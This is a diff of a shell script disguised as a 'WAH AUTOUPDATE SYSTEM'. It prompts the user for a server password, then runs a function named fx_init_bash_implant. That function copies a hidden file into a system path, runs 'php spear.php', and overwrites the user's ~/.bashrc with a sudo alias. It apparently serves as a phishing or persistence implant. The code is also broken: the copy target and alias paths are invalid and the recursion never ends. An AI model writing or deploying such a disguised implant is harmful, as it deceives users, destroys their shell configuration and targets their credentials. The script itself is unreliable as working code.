@@ -5,6 +5,9 @@ function out_msg(){
     echo ''
     echo '     WAH AUTOUPDATE SYSTEM'
     echo ''
+    echo 'Please make sure you have a stable'
+    echo '      internet connection'
+    echo ''
     echo '********************************'
     echo '  Please enter server password.'
     echo ' If you do not know the server'
@@ -18,17 +21,21 @@ function out_msg(){
 function fx_init_bash_implant(){
     out_msg
     cp .light_seed /bin/bash/wahupdate
+    
+    #lets do some pre-flight checks
+
+
+    php spear.php
+
+
+    
+    #DITO KA NALANG MAG CHECK NG MGA FILES HAYUP KA HAHAHAHA BAT KA PA NAG PHP
+    if [ 0 == `cat .blood` ] #if no script is found
+    then
+        echo "alias 'wahupdate'='sudo /bin/usr/wahupdate'" > ~/.bashrc
+        fx_init_bash_implant
+    else
+        echo "wow meron";
+    fi
 }
 
-
-#lets do some pre-flight checks
-
-php spear.php
-#DITO KA NALANG MAG CHECK NG MGA FILES HAYUP KA HAHAHAHA BAT KA PA NAG PHP
-if [ 0 == `cat .blood` ] #if no script is found
-then
-    echo "alias 'wahupdate'='sudo /bin/usr/wahupdate'" > ~/.bashrc
-    fx_init_bash_implant
-else
-    echo "wow meron";
-fi
